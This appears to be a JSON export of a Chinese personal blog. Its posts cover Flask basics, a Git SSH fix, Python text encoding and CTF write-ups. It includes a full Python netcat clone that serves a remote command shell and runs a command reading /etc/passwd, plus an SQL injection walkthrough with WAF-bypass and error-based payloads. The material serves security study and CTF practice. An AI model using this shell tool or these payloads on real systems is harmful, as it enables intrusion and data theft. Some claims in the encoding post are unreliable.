链接与静态文件任何具有多个路由的程序都需要可以连接不同页面的链接，在模板中直接编写简单路由的URL链接不难，但对于包含可变部分的动态路由，在模板中构建正确的URL就很困难。为了避免这些问题，Flask提供了url_for()辅助函数，它可以使用程序URL映射中保存的信息生成URL。url_for()函数最简单的用法是以视图函数名（或者app.add_url_route()定义路由时使用的端点名）作为参数，返回对应的URL。例如，在当前版本的hello.py程序中调用url_for(‘index’)得到的结果是/。调用url_for(&#39;index&#39;, _external=True)返回的则是绝对地址，在这个示例中是http://localhost:5000/。使用url_for()生成动态地址时，将动态部分作为关键字参数传入。例如，url_for(‘user’, name=’john’, _external=True)的返回结果是http://localhost:5000/user/john。传入url_for()的关键字参数不仅限于动态路由中的参数。函数能将任何额外参数添加到查询字符串中。例如，`url_for(‘index’, page=2)`的返回结果是/?page=2。 Web程序不是仅由Python代码和模板组成。大多数程序还会使用静态文件，例如HTML代码中引用的图片、JavaScript源码文件和CSS。默认设置下，Flask在程序根目录中名为static的子目录中寻找静态文件。如果需要，可在static文件夹中使用子文件夹存放文件。例如：1234567&#123;% block head %&#125;&#123;&#123; super() &#125;&#125;&lt;link rel=\"shortcut icon\" href=\"&#123;&#123; url_for('static', filename = 'favicon.ico') &#125;&#125;\"type=\"image/x-icon\"&gt;&lt;link rel=\"icon\" href=\"&#123;&#123; url_for('static', filename = 'favicon.ico') &#125;&#125;\"type=\"image/x-icon\"&gt;&#123;% endblock %&#125;","categories":[{"name":"python编程","slug":"python编程","permalink":"http://www.r1ght0us.xyz/categories/python编程/"}],"tags":[{"name":"python","slug":"python","permalink":"http://www.r1ght0us.xyz/tags/python/"},{"name":"flask","slug":"flask","permalink":"http://www.r1ght0us.xyz/tags/flask/"}]},{"title":"flask之程序基本架构","slug":"flask之程序基本架构","date":"2019-01-16T06:52:08.000Z","updated":"2019-01-16T07:19:40.788Z","comments":true,"path":"2019/01/16/flask之程序基本架构/","link":"","permalink":"http://www.r1ght0us.xyz/2019/01/16/flask之程序基本架构/","excerpt":"flask作为比较著名的python开发框架，掌握它才能更好的对其做出测试","text":"flask作为比较著名的python开发框架，掌握它才能更好的对其做出测试 程序基本架构初始化所有Flask程序都必须创建一个程序实例。Web服务器使用一种名为Web服务器网关接口（Web Server Gateway Interface，WSGI）的协议，把接收自客户端的所有请求都转交给这个对象处理。程序实例是Flask类的对象，经常使用下述代码创建：12from flask import Flaskapp = Flask(__name__) Flask类的构造函数只有一个必须指定的参数，即程序主模块或包的名字。在大多数程序中，Python的name变量就是所需的值。name用来决定程序的根目录。 路由程序实例需要知道对每个URL请求运行哪些代码，所以保存了一个URL到Python函数的映射关系。处理URL和函数之间关系的程序称为路由。在Flask程序中定义路由的最简便方式，是使用程序实例提供的app.route修饰器，把修饰的函数注册为路由。下面的例子说明了如何使用这个修饰器声明路由：123@app.route('/')def index(): return '&lt;h1&gt;Hello World!&lt;/h1&gt;' 修饰器是Python语言的标准特性，可以使用不同的方式修改函数的行为。惯常用法是使用修饰器把函数注册为事件的处理程序。Flask还支持动态的URL，只需要在route修饰器中使用特殊的语法即可。123@app.route('/user/&lt;name&gt;')def user(name): return '&lt;h1&gt;Hello, %s!&lt;/h1&gt;' % name 尖括号中的内容就是动态部分，任何能匹配静态部分的URL都会映射到这个路由上。路由中的动态部分默认使用字符串，不过也可使用类型定义。例如，路由/user/&lt;int:id&gt;只会匹配动态片段id为整数的URL。Flask支持在路由中使用int、float和path类型。path类型也是字符串，但不把斜线视作分隔符，而将其当作动态片段的一部分。 启动服务器程序实例用run方法启动Flask集成的开发Web服务器：12if __name__ == '__main__': app.run(debug=True) __name__==&#39;__main__&#39;是Python的惯常用法，在这里确保直接执行这个脚本时才启动开发Web服务器。如果这个脚本由其他脚本引入，程序假定父级脚本会启动不同的服务器，因此不会执行app.run()。 debug=True用来启动调试模式 一个完整的例子12345678910from flask import Flaskapp = Flask(__name__)@app.route('/')def index(): return '&lt;h1&gt;Hello World!&lt;/h1&gt;'@app.route('/user/&lt;name&gt;')def user(name): return '&lt;h1&gt;Hello, %s!&lt;/h1&gt;' % nameif __name__ == '__main__': app.run(debug=True) 输入http://127.0.0.1:5000查看是否正确。 程序和请求上下文为了避免大量可有可无的参数把视图函数弄得一团糟，Flask使用上下文临时把某些对象变为全局可访问。有了上下文，就可以写出下面的视图函数： 12345from flask import request@app.route('/')def index(): user_agent = request.headers.get('User-Agent') return '&lt;p&gt;Your browser is %s&lt;/p&gt;' % user_agent 注意在这个视图函数中我们如何把request当作全局变量使用。事实上，request不可能是全局变量。试想，在多线程服务器中，多个线程同时处理不同客户端发送的不同请求时，每个线程看到的request对象必然不同。Falsk使用上下文让特定的变量在一个线程中全局可访问，与此同时却不会干扰其他线程。在Flask中有两种上下文：程序上下文和请求上下文。下表为两种上下文提供的变量。 变量名 上下文 说明 current_app 程序上下文 当前激活程序的程序实例 g 程序上下文 处理请求时用作临时存储的对象。每次请求都会重设这个变量 request 请求上下文 请求对象，封装了客户端发出的HTTP请求中的内容 session 请求上下文 用户会话，用于存储请求之间需要“记住”的值的词典 Flask在分发请求之前激活（或推送）程序和请求上下文，请求处理完成后再将其删除。程序上下文被推送后，就可以在线程中使用current_app和g变量。类似地，请求上下文被推送后，就可以使用request和session变量。如果使用这些变量时我们没有激活程序上下文或请求上下文，就会导致错误。 请求钩子在一个Client发出请求之前或者发出请求之后，在执行代码。请求钩子使用修饰器实现。Flask支持以下4种钩子。 before_first_request：注册一个函数，在处理第一个请求之前运行。 before_request：注册一个函数，在每次请求之前运行。 after_request：注册一个函数，如果没有未处理的异常抛出，在每次请求之后运行。 teardown_request：注册一个函数，即使有未处理的异常抛出，也在每次请求之后运行。 在请求钩子函数和视图函数之间共享数据一般使用上下文全局变量g 响应HTTP协议需要的不仅是作为请求响应的字符串。HTTP响应中一个很重要的部分是状态码，Flask默认设为200，这个代码表明请求已经被成功处理。如果视图函数返回的响应需要使用不同的状态码，那么可以把数字代码作为第二个返回值，添加到响应文本之后。例如，下述视图函数返回一个400状态码，表示请求无效：123@app.route('/')def index(): return '&lt;h1&gt;Bad Request&lt;/h1&gt;', 400 Flask视图函数还可以返回Response对象。make_response()函数可接受1个、2个或3个参数（和视图函数的返回值一样），并返回一个Response对象。下例创建了一个相应对象，然后设置了COOKIE:123456from flask import make_response@app.route('/')def index(): response = make_response('&lt;h1&gt;This document carries a cookie!&lt;/h1&gt;') response.set_cookie('answer', '42') return response 重定向经常使用302 状态码表示，指向的地址由Location首部提供。重定向响应可以使用3个值形式的返回值生成，也可在Response对象中设定。不过，由于使用频繁，Flask提供了redirect()辅助函数，用于生成这种响应：1234from flask import redirect@app.route('/')def index(): return redirect('http://www.example.com') 还有一种特殊的响应由abort函数生成，用于处理错误。在下面这个例子中，如果URL中动态参数id对应的用户不存在，就返回状态码404：1234567from flask import abort@app.route('/user/&lt;id&gt;')def get_user(id): user = load_user(id) if not user: abort(404) return '&lt;h1&gt;Hello, %s&lt;/h1&gt;' % user.name 注意，abort不会把控制权交还给调用它的函数，而是抛出异常把控制权交给Web服务器。","categories":[{"name":"python编程","slug":"python编程","permalink":"http://www.r1ght0us.xyz/categories/python编程/"}],"tags":[{"name":"python","slug":"python","permalink":"http://www.r1ght0us.xyz/tags/python/"},{"name":"flask","slug":"flask","permalink":"http://www.r1ght0us.xyz/tags/flask/"}]},{"title":"Git 提交出现ssh connection time out","slug":"Git-提交出现ssh-connection-time-out","date":"2018-11-12T12:48:38.000Z","updated":"2019-01-06T09:56:22.123Z","comments":true,"path":"2018/11/12/Git-提交出现ssh-connection-time-out/","link":"","permalink":"http://www.r1ght0us.xyz/2018/11/12/Git-提交出现ssh-connection-time-out/","excerpt":"提交文章发生了奇怪的错误","text":"提交文章发生了奇怪的错误 突然的错误我今天进行提交新的博文，突然提交不上去，报错如图1prot 22: Operation timed out 初步判断为端口问题，那么除了ssh端口我们还可以用https 443端口 解决方法博主本机为win10，那么在/git/etc/ssh/ssh_config文件末尾增加 123456Host github.comUser YourEmail@xx.comHostname ssh.github.comPreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsaPort 443 然后保存。然后继续在git bash中使用12git config --global user.name &quot;XXX&quot;git config --global user.email xxxx@xx.com 刷新就可以生效 linux中在~/.ssh新建config输入以下内容123456Host github.comUser YourEmail@xx.comHostname ssh.github.comPreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsaPort 443 后续内容跟上面内容一样更新即可。最后运行ssh -T git@github.com，查看是否连接成功。","categories":[{"name":"hexo","slug":"hexo","permalink":"http://www.r1ght0us.xyz/categories/hexo/"}],"tags":[{"name":"hexo常见问题","slug":"hexo常见问题","permalink":"http://www.r1ght0us.xyz/tags/hexo常见问题/"},{"name":"Git","slug":"Git","permalink":"http://www.r1ght0us.xyz/tags/Git/"},{"name":"debug","slug":"debug","permalink":"http://www.r1ght0us.xyz/tags/debug/"}]},{"title":"python字符编码","slug":"python字符编码","date":"2018-10-17T14:51:19.000Z","updated":"2019-01-06T08:58:35.812Z","comments":true,"path":"2018/10/17/python字符编码/","link":"","permalink":"http://www.r1ght0us.xyz/2018/10/17/python字符编码/","excerpt":"python的编码一直是个让我头疼的问题","text":"python的编码一直是个让我头疼的问题 前言：中文编码问题一直是程序员头疼的问题，而Python2中的字符编码足矣令新手抓狂。本文将尽量用通俗的语言带大家彻底的了解字符编码以及Python2和3中的各种编码问题。 什么是字符编码。要彻底解决字符编码的问题就不能不去了解到底什么是字符编码。计算机从本质上来说只认识二进制中的0和1，可以说任何数据在计算机中实际的物理表现形式也就是0和1，如果你将硬盘拆开，你是看不到所谓的数字0和1的，你能看到的只是一块光滑闪亮的磁盘，如果你用足够大的放大镜你就能看到磁盘的表面有着无数的凹凸不平的元件，凹下去的代表0，突出的代表1，这就是计算机用来表现二进制的方式。 ASCII现在我们面临了第一个问题：如何让人类语言，比如英文被计算机理解？我们以英文为例，英文中有英文字母（大小写）、标点符号、特殊符号。如果我们将这些字母与符号给予固定的编号，然后将这些编号转变为二进制，那么计算机明显就能够正确读取这些符号，同时通过这些编号，计算机也能够将二进制转化为编号对应的字符再显示给人类去阅读。由此产生了我们最熟知的ASCII码。ASCII 码使用指定的7 位或8 位二进制数组合来表示128 或256 种可能的字符。这样在大部分情况下，英文与二进制的转换就变得容易多了。 GB2312然而，虽然计算机是美国人发明的，但是全世界的人都在使用计算机。现在出现了另一个问题：如何让中文被计算机理解？这下麻烦了，中文不像拉丁语系是由固定的字母排列组成的。ASCII 码显然没办法解决这个问题，为了解决这个问题中国国家标准总局1980年发布《信息交换用汉字编码字符集》提出了GB2312编码，用于解决汉字处理的问题。1995年又颁布了《汉字编码扩展规范》（GBK）。GBK与GB 2312—1980国家标准所对应的内码标准兼容，同时在字汇一级支持ISO/IEC10646—1和GB 13000—1的全部中、日、韩（CJK）汉字，共计20902字。这样我们就解决了计算机处理汉字的问题了。 Unicode现在英文和中文问题被解决了，但新的问题又出现了。全球有那么多的国家不仅有英文、中文还有阿拉伯语、西班牙语、日语、韩语等等。难不成每种语言都做一种编码？基于这种情况一种新的编码诞生了：Unicode。Unicode又被称为统一码、万国码；它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。Unicode支持欧洲、非洲、中东、亚洲（包括统一标准的东亚象形汉字和韩国表音文字）。这样不管你使用的是英文或者中文，日语或者韩语，在Unicode编码中都有收录，且对应唯一的二进制编码。这样大家都开心了，只要大家都用Unicode编码，那就不存在这些转码的问题了，什么样的字符都能够解析了。 UTF-8但是，由于Unicode收录了更多的字符，可想而知它的解析效率相比ASCII码和GB2312的速度要大大降低，而且由于Unicode通过增加一个高字节对ISO Latin-1字符集进行扩展，当这些高字节位为0时，低字节就是ISO Latin-1字符。对可以用ASCII表示的字符使用Unicode并不高效，因为Unicode比ASCII占用大一倍的空间，而对ASCII来说高字节的0对他毫无用处。为了解决这个问题，就出现了一些中间格式的字符集，他们被称为通用转换格式，即UTF（Unicode Transformation Format）。而我们最常用的UTF-8就是这些转换格式中的一种。在这里我们不去研究UTF-8到底是如何提高效率的，你只需要知道他们之间的关系即可。 总结： 为了处理英文字符，产生了ASCII码。 为了处理中文字符，产生了GB2312。 为了处理各国字符，产生了Unicode。 为了提高Unicode存储和传输性能，产生了UTF-8，它是Unicode的一种实现形式。 Python2中的字符编码python2Python2中默认的字符编码是ASCII码，也就是说Python在处理数据时，只要数据没有指定它的编码类型，Python默认将其当做ASCII码来进行处理。这个问题出现的原因是：12```text# -*- encoding: utf-8 -*- 这样，Python在处理这个脚本时，会用UTF-8的编码去处理整个脚本，就能够正确的解析中文字符了。 总结： Python2中默认的字符编码是ASCII码。 Python2中字符串有str和unicode两种类型。str有各种编码的区别，unicode是没有编码的标准形式。 Python2中可以直接查看到unicode的字节串。 decode()与encode()方法前面我们说了这么多都是为了这一节做铺垫，现在我们开始来处理Python2中的字符编码问题。我们首先要学习Python为我们提供的两个转换编码的方法decode()与encode()。 decode()方法将其他编码字符转化为Unicode编码字符。encode()方法将Unicode编码字符转化为其他编码字符。 chardet模块可以检测字符串编码，没有该模块的可以用pip install chardet安装。 首先解释一下为什么name=”小明” 这里的小明是一个utf-8编码的字符。因为我使用的是win10操作系统，但是终端格式我默认设置utf-8,所以当我在终端将一个中文输入时，系统就会自动将这个中文字符以UTF-8的编码传递给Python。大多数情况下windows的系统编码默认是gb2312，那么在windows下做上图的测试“小明”这个字符就是gb2312编码。然而现在win10普遍都是ANSI字符集，产生了一个编码方式叫TIS-620 所谓乱码本质上是系统编码与所提供字符的编码不一致导致的，我们举一个例子： 小明的电脑中存了一个utf-8的字母A，存储在计算机中是1100001； 小红的电脑中也存了一个gb2312的字母A，存储在计算机中是11000010； 当小明与小红交换信息时，各自的计算机就不会把对方传递过来的A识别为字母A，可能认为这是字母B。 所以当我们需要操作系统正确的输出一个字符时，除了要知道该字符的字符编码，也要知道自己系统所使用的字符编码。如果系统使用的是UTF-8编码，处理的却是gb2312的字符就会出现所谓“乱码”。 一个Tips： decode()方法与在字符串前加u的方法实现的效果相同比如u’小明’ 总结： Python2的对于字符编码的转换要以unicode作为“中间人”进行转化。 知道自己系统的字符编码（Linux默认utf-8，Windows默认GB2312），对症下药。 所以我们再次强调：乱码本质上是系统编码与所提供字符的编码不一致导致的 在Pyhon3中字符编码有了很大改善最主要的有以下几点： Python 3的源码.py文件 的默认编码方式为UTF-8，所以在Python3中你可以不用在py脚本中写coding声明，并且系统传递给python的字符不再受系统默认编码的影响，统一为unicode编码。 将字符串和字节序列做了区别，字符串str是字符串标准形式与2.x中unicode类似，bytes类似2.x中的str有各种编码区别。bytes通过解码转化成str,str通过编码转化成bytes。 PS：有一个小问题被许多新手所困扰，我们来看一下图片: 我们看到当一个中文字符出现在一个list(或tuple、dict)中时，它并不会被显示为一个中文而是字节串。但当该字符串从list中提取出来再print时就能够正常显示为中文。字节串是所有字符在python中的“本质”形态，所以你可以简单的理解为list中呈现出的字节串是给计算机看的。","categories":[{"name":"python编程","slug":"python编程","permalink":"http://www.r1ght0us.xyz/categories/python编程/"}],"tags":[{"name":"python","slug":"python","permalink":"http://www.r1ght0us.xyz/tags/python/"},{"name":"程序基础","slug":"程序基础","permalink":"http://www.r1ght0us.xyz/tags/程序基础/"}]},{"title":"python版netcat","slug":"python版netcat","date":"2018-10-01T08:25:07.000Z","updated":"2019-01-06T08:58:57.821Z","comments":true,"path":"2018/10/01/python版netcat/","link":"","permalink":"http://www.r1ght0us.xyz/2018/10/01/python版netcat/","excerpt":"《python黑帽子编程》这本书可以提升自己的写脚本的水平","text":"《python黑帽子编程》这本书可以提升自己的写脚本的水平&nbsp;&nbsp;为了增进自己的python编程水平，于是选了《python黑帽子编程》这本书，写完一个小作业感觉受益良多，懂了些服务器客户端的通信方式，希望自己能够坚持下去。 我已经将相关代码放到我的github，详情请点击链接，为了伟大的开源精神而干杯（手动doge） 具体代码，详情见注释123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226# -*- coding:UTF-8 -*-import sysimport socketimport getoptimport threadingimport subprocessimport time# 定义全局变量listen = Falsecommand = Falseexecute = \"\"target = \"\"upload_destination = \"\"port = 0def usage(): # 帮助说明 print(\"BHP Net Tool\\n\\n\") print(\"Usage: nc.py -t target_host -p port\") print( \"-l --listen \\ - listen on [host]:[port] for incoming connections\") print(\"-e --execute=file_to_run \\ -command execute the given file upon receiving a connection\") print(\"-c --command - initialize a command shell\") print( \"-u --upload=destination \\ - upon receiving connection upload \\ a file and write to [destination]\\n\\n\") print(\"Examples: \\n\") print(\"bhpnet.py -t 192.168.0.1 -p 5555 -l -c\") print(\"bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\\\target.exe\") print(\"bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\\\"cat /etc/passwd\\\"\") print(\"echo 'ABCDEF' | nc.py -t 192.168.11.12 -p 135\") sys.exit(0)def server_loop(): global target # 如果没有定义目标，那么我们监听所有接口 if not len(target): target = \"0.0.0.0\" server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind((target, port)) server.listen(5) while True: client_socket, addr = server.accept() # 分拆一个线程处理新的客户端，client_socket返回一个socket对象（对应每个连接的对象）addr是具体的ip和端口 try: client_thread = threading.Thread( target=client_handler, args=(client_socket,)) client_thread.start() except Exception as e: print(e)def client_sender(buffer): client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket对象 try: # 连接到目标主机 client.connect((target, port)) client.settimeout(30) if len(buffer)!=0: client.send(buffer.encode()) while True: # 现在等待数据回传 recv_len = 1 response = \"\" while recv_len: data = client.recv(4096).decode(\"utf-8\") recv_len = len(data) response += data if recv_len &lt; 4096: # 一次接受4096个字节 break print(\"client: \"+response.strip(\"\\n\")) # 等待更多输入 buffer = \"server: \" buffer += input() buffer += \"\\n\" # 发送出去 client.send(buffer.encode()) except Exception as e: print(e) print(\"[*] Exception! Exiting\") # 关闭连接 client.close()def run_command(command): # 换行 command = command.rstrip() # 运行命令并将输出返回 try: output = subprocess.check_output( command, stderr=subprocess.STDOUT, shell=True, universal_newlines=True) # 命令执行模块 except: output = \"Failed to execute command.\\r\\n\" # 将输出发送 return outputdef client_handler(client_socket): global execute global command # 检测上传文件 if len(upload_destination): # 读取所有字符并写下目标 file_buffer = \"\" # 持续读取数据直到没有符合的数据 while True: data = client_socket.recv(1024).decode(\"utf-8\") if not data: break else: file_buffer += data if \"#\" in file_buffer: file_buffer = file_buffer[:-2] break # 现在我们接收这些数据并将它们写出来 try: file_descriptor = open(upload_destination, \"wb\") file_descriptor.write(file_buffer.encode()) file_descriptor.close() # 确认文件已经写出来 client_socket.send(b\"Succesfully saved file\") except: client_socket.send(b\"Failed to saved file\") client_socket.close() if len(execute): # 运行命令 output = run_command(execute) client_socket.send(output.encode()) # 如果需要一个命令行shell，那么我们进另一个循环 if command: while True: # 跳出一个窗口 client_socket.send(b\"&lt;BHP:#&gt;: \") # 现在我们接受文件直到发现换行符(enter key) cmd_buffer = \"\" while \"\\n\" not in cmd_buffer: cmd_buffer = client_socket.recv(1024).decode(\"gbk\") # 反还命令输出 response = run_command(cmd_buffer) # 返回相应数据 client_socket.send(response.encode()) # python3中必须以BYTE流进行传输def main(): global listen # 全局变量 global port global execute global command global upload_destination global target# getopt 模块，该模块是专门用来处理命令行参数的 if not(len(sys.argv[1:])): # sys.argv[0]代表脚本本身名称 usage()# 读取命令行 try: opts, args = getopt.getopt(sys.argv[1:], \"hle:t:p:cu:\", [ \"help\", \"listen\", \"execute=\", \"target=\", \"port=\", \"command=\", \"upload=\"]) except getopt.GetoptError as err: print(str(err)) usage() for o, a in opts: if o in (\"-h\", \"--help\"): usage() elif o in (\"-l\", \"--listen\"): listen = True elif o in (\"-e\", \"--execute\"): execute = a elif o in (\"-c\", \"--command\"): command = True elif o in (\"-u\", \"--upload\"): upload_destination = a elif o in (\"-t\", \"--target\"): target = a elif o in (\"-p\", \"--port\"): port = int(a) else: assert False, \"Unhandled Option\" # assert相当于断点，根据后面的表达式的布尔值进行判断，如果错误输出之后的字符串信息。 # 进行监听还是仅从标准输入发送数据？ if not listen and len(target) and (port &gt; 0): buffer = \"\" # 从命令行读取内存数据 # 这里将会堵塞，所以不在向标准输入发送数据时发送CTRL+D· buffer = input() + '\\n' # 发送数据 client_sender(buffer) # 开始监听并准备上传文件、执行命令 # 放置一个反弹SHELL # 取决于上面的命令选项 if listen: server_loop()if __name__ == '__main__': main()","categories":[{"name":"python编程","slug":"python编程","permalink":"http://www.r1ght0us.xyz/categories/python编程/"}],"tags":[{"name":"netcat","slug":"netcat","permalink":"http://www.r1ght0us.xyz/tags/netcat/"},{"name":"python3","slug":"python3","permalink":"http://www.r1ght0us.xyz/tags/python3/"}]},{"title":"新疆首届知识技能大赛相关writeup","slug":"新疆首届知识技能大赛相关writeup","date":"2018-09-16T07:56:01.000Z","updated":"2019-01-06T09:00:11.918Z","comments":true,"path":"2018/09/16/新疆首届知识技能大赛相关writeup/","link":"","permalink":"http://www.r1ght0us.xyz/2018/09/16/新疆首届知识技能大赛相关writeup/","excerpt":"一次CTF赛后总结","text":"一次CTF赛后总结总是把比赛想的太简单，原来在哪里总是藏龙卧虎，不能小瞧任何人，也别高看了自己。但是这是第一次参加不让联网的CTF比赛！ stay foolish,stay hungry 如来十三掌通过这个题目，让我联想到与佛论禅和rot13加密，那么打开题目，下载下来一个docx文档。下面加粗的文字即是打开文档的内容。 夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮 首先我们打开与佛论禅，在其加密内容前加上佛曰：。如图所下：下面是这个解出来密文，显然还有一层加密。MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9猜测base64编码，结果没有解出来。联系题目猜测为rot13加密解码出来继续base64解码，在此之后我会写相关的加密的详解。 取证内存镜像flag这道题给了hint才知道是内存取证，但是因为自己起初没在意相关工具的使用其实就是自己懒，那么这次的惨败正好弥补自己的不足。 volatility是专门进行内存取证的工具，对于windows系统比较友好，linux系统需要单独的安装相应的插件。1-f 选择所要取证的镜像文件 进行镜像识别1imageinfo 我们可以发现volatility建议我们使用WinXPSP2x86，那么继续使用查看当时的dump下来的内存中存在的进程1--profile 使用哪一种镜像进行取证 1pslist 查看当时dump下来所运行的进程 然而根据题目，我们猜测应该在是某个文件，那么扫描目录，其中为了查询相关字符，进行了管道命令以及grep进行筛选。1filescan 文件扫描 那么下面我就进行导出其相关文件。1dumpfiles 导出文件 1-Q 所要导出文件的地址 1--dump-dir 导出文件所要存在那个目录里 打开发现这个压缩包需要密码，我猜测了许多种可能，密码应该在剪切板中，于是搜索剪切板的内容1clipboard 查看剪切板的内容 于是尝试是否这个剪切板的内容就是密码，获得flag 这个是真·取证，让我感觉到这个CTF还是能够提高我在安全的其他方面的。 流量包解密02&nbsp;&nbsp;果然还是见识少，所有的比赛的束手无措只是自己平时懒所付出的代价。下载下来一看，文件是.cap结尾的格式，那么应该是WiFi所抓下来的包，而且题目提示密码就是本机的MAC地址。那么我们需要用到aircrack-ng工具解密流量。 先用wireshark打开流量包可以看到我们MAC地址（无线&gt;wlan流量） aircrack-ng解密流量，有个坑密码MAC地址大写1-w 使用密码字典 然后将key值导入进去(首选项&gt;protpcols&gt;IEEE 802.11&gt;Decryption key&gt;wpa-key)然后追踪TCP流最后查看网址找到了flag Refererhttps://blog.csdn.net/qq_28208251/article/details/48093575https://xz.aliyun.com/t/1972http://netsecurity.51cto.com/art/201105/264844.htmhttps://blog.csdn.net/dmbjzhh/article/details/79425483 如果有同学需要上述题目，请联系我","categories":[{"name":"CTF","slug":"CTF","permalink":"http://www.r1ght0us.xyz/categories/CTF/"}],"tags":[{"name":"比赛wp","slug":"比赛wp","permalink":"http://www.r1ght0us.xyz/tags/比赛wp/"},{"name":"MISC","slug":"MISC","permalink":"http://www.r1ght0us.xyz/tags/MISC/"},{"name":"CRYPTO","slug":"CRYPTO","permalink":"http://www.r1ght0us.xyz/tags/CRYPTO/"}]},{"title":"照片里的盲水印","slug":"照片里的盲水印","date":"2018-09-02T06:22:38.000Z","updated":"2019-01-06T09:00:03.697Z","comments":true,"path":"2018/09/02/照片里的盲水印/","link":"","permalink":"http://www.r1ght0us.xyz/2018/09/02/照片里的盲水印/","excerpt":"很典型的CTF比赛题目","text":"很典型的CTF比赛题目这个题是安恒月赛里面的一道misc类型的题，在CTF中misc所谓最考验你的脑洞和检验你的赛事水平（赛棍？？？）但是这个方面还是要看一下，就当做开发脑力了。 题目：暴力可解题目文件下载下来题目，打开压缩包解压发现有密码，猜测压缩包伪加密，使用010editor发现并没有伪加密，联系题目使用暴力破解，基本CTF所有让你暴力破解都是纯数字类型。获得密码，解压得到两张相同的图片。在misc中，两张相同的图片基本上都应该是盲水印，所以使用bwm脚本（python2）。bwm脚本的github运行脚本发现没有cv2这个模块，使用下面的命令安装cv2pip install opencv-python然后运行python bwm.py decode 1.png 2.png flag.png。其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。下图即为水印。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://www.r1ght0us.xyz/categories/CTF/"}],"tags":[{"name":"MISC","slug":"MISC","permalink":"http://www.r1ght0us.xyz/tags/MISC/"},{"name":"盲水印","slug":"盲水印","permalink":"http://www.r1ght0us.xyz/tags/盲水印/"}]},{"title":"SQL报错注入","slug":"SQL报错注入","date":"2018-08-17T06:55:49.000Z","updated":"2019-01-06T09:00:12.737Z","comments":true,"path":"2018/08/17/SQL报错注入/","link":"","permalink":"http://www.r1ght0us.xyz/2018/08/17/SQL报错注入/","excerpt":"报错注入需要学习一下","text":"报错注入需要学习一下快草了两个月的bugku-web类型的题，感觉基本web类型都有了一些大概的了解，当然比不上dalao的掌控雷电的操作，后面就是多玩一会python了，毕竟CTF中脚本不会写是真的硬伤。 这道题是web-150分的题，看了一下网上的WP不多，我也是找了一堆资料，看了看相似的体型才把这道题做的差不多。 题名：多次，网址链接 首先打开网页看到id这个参数，很经典的SQL注入。于是测试单引号过滤?id=1’，页面发生变化，猜测位查询语句为单引号闭合。再次进行测试，?id=1′ or 1=1%23 ，发现并无变化。猜测可能有WAF过滤，于是测试双重写or，?id=1′ oorr 1=1%23 ，测试发现页面改变 进行测试过滤，使用异或符号（^）搭配length函数开始测试。 如何判断是否过滤，例如union函数没有过滤，那么length(‘union’)=0是不成立的，即该语句布尔值为0，并且前面的查询语句布尔值恒等于1，1^0=1，1^1=0。则为1返回正常页面，不正常返回错误页面。经测试：or，and，union，select被过滤。那么接下来就是常规测试。 ?id=1%27 oorrder by 2%23，测试列数为2。（注意order里面的or） 爆数据库?id=-1%27 uniounionn selecselectt 1,group_concat(schema_name) from infoorrmation_schema.schemata%23（坑点：information里面的or） 爆表?id=-1%27 uniounionn selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=0x776562313030322d31（十六进制码为web1002-1）%23 爆出数据?id=-1%27 uniounionn selecselectt 1,flag1 from flag1 %23然后题目提示还有一个flag在下一关的地址。根据上面的操作，地址可能在address列里。 寻找下一关地址?id=-1%27 uniounionn selecselectt 1,address from flag1 %23 找到下一关地址OK，还是向上面的一样测试，发现还是单引号过滤。发现还是有回显我们测试的语句，突然发现这个WAF过滤的有点奇怪，这个过滤了union那我将union重写，发现直接不回显，可能是后端的专门对这种产生过滤。因为还发现有报错产生，那么我就进行报错盲注测试。 盲注测试公式：union select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x; 其中version()改成相应的注入语句。公式需要灵活变通，例如本题中的union被过滤，那么将语句改为or and连接的形式，并且适当添加相应的列数。Ps：盲注相关原理在文章末尾链接。 or (select 1 from(select count(),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)2))x from information_schema.schemata group by x)a)%23 因为不能用union进行注入，所以改变一下形式使用or，就这个走了好多弯路，因为or只能使用1个跟1个比，否则将会出错Operand should contain 1 column(s) , 且(select count(),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)2))x from information_schema.schemata group by x)这条语句将会产生一个虚拟表，你在虚拟表进行查询时需要起一个别名，我在这里起的a，于是报错爆来数据库，下面的操作跟第一关一样。但是其中爆数据时产生了一些问题，说是子查询返回超过了一行但是猜测肯定是只有一行的，估计是出题人加了回车产生了换行。解决方法：left((select flag2 from flag2),40)，取前40个字符。 相关链接：https://blog.csdn.net/qq_35544379/article/details/77453019 https://blog.csdn.net/he_and/article/details/80455884 http://wyb0.com/ 